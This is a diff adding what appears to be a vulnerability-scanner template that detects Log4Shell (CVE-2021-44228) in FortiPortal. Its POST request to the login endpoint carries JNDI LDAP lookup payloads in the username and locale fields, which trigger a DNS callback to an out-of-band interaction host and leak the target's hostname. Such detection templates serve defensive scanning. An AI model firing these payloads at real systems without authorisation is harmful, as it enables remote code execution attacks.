@@ -1,0 +1,33 @@
+id: fortiportal-log4j-rce
+brief:
+    title: FortiPortal - Remote Code Execution (Apache Log4j)
+    by: shaikhyaser
+    level: critical
+    about: FortiPortal is susceptible to Log4j JNDI remote code execution. FortiPortal provides comprehensive security management and analytics within a multi-tenant, multi-tier management framework.
+    label:
+        - cve
+        - cve2021
+        - rce
+        - jndi
+        - log4j
+        - fortiportal
+        - oast
+        - kev
+        - vuln
+    score: CVE-2021-44228 CVSS:10.0
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/fpc/login/'
+      head:
+        Accept: application/json, text/plain, */*
+        Content-Type: application/json
+        Origin: '{{RootURL}}'
+        Referer: '{{RootURL}}/fpc/app/login'
+      body: '{"username":"${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}","password":"{{str}}","isAdmin":false,"locale":"${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}"}'
+      signs:
+        - "on": word
+          has:
+            - dns
+          in: interactsh_protocol
+          need: all
